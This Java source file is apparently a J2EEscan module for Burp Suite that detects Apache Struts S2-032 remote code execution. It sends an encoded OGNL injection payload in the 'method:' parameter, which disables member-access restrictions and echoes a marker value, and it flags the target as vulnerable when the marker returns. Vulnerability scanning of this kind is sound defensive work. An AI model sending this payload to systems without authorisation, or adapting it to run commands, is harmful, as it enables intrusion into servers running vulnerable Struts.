package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Apache Struts S2-032 Remote Command Execution
 * 
 * https://struts.apache.org/docs/s2-032.html
 * 
 */
public class ApacheStrutsS2032 implements IModule {

    private static final String TITLE = "Apache Struts S2-032 Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a Remote Code Execution "
            + "via <i>method:</i> prefix because Dynamic Method Invocation is enabled."
            + "A remote user could be able to manipulate the servlet container's classloader to execute"
            + "arbitrary commands on the remote system.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://struts.apache.org/docs/s2-032.html<br />"
            + "http://seclab.dbappsecurity.com.cn/?p=924<br />"
            + "http://d.hatena.ne.jp/Kango/20160427/1461771099<br />"
            + "http://pan.baidu.com/s/1skTs9Md<br />"
            + "MSF: metasploit-framework/modules/exploits/linux/http/struts_dmi_exec.rb";
    private static final String REMEDY = "Update the remote Struts vulnerable library";

    // Check for specific patterns on response page
    private static final Pattern DYNAMIC_METHOD_INVOCATION = Pattern.compile("HOOK_VAL838",
            Pattern.DOTALL | Pattern.MULTILINE);

    private PrintWriter stderr;
        
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        List<IParameter> parameters = reqInfo.getParameters();

        URL curURL = reqInfo.getUrl();

        byte[] modifiedRawRequest = null;
        List<IScanIssue> issues = new ArrayList<>();

        if (!isJavaApplicationByURL(curURL)) {
            return issues;
        }

        byte[] rawrequest = baseRequestResponse.getRequest();
        //Remove URI parameters
        for (IParameter param : parameters) {
            rawrequest = callbacks.getHelpers().removeParameter(rawrequest, param);
        }

        rawrequest = callbacks.getHelpers().addParameter(rawrequest,
                callbacks.getHelpers().buildParameter("method:", "%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.hook[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString", IParameter.PARAM_URL)
        );
       
        String utf8rawRequest;
        try {
            
             //TODO Fix me hack
            utf8rawRequest = new String(rawrequest, "UTF-8");
            modifiedRawRequest = utf8rawRequest.replaceFirst("=", "").getBytes();

            modifiedRawRequest = callbacks.getHelpers().addParameter(modifiedRawRequest,
                    callbacks.getHelpers().buildParameter("hook", "HOOK_VAL", IParameter.PARAM_URL)
            );

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), modifiedRawRequest);

            // Get the response body
            byte[] responseBytes = checkRequestResponse.getResponse();
            String response = helpers.bytesToString(responseBytes);

            Matcher matcher = DYNAMIC_METHOD_INVOCATION.matcher(response);

            if (matcher.find()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Certain
                ));
            }

        } catch (UnsupportedEncodingException ex) {
            stderr.println(ex);
        }

        return issues;
    }
}
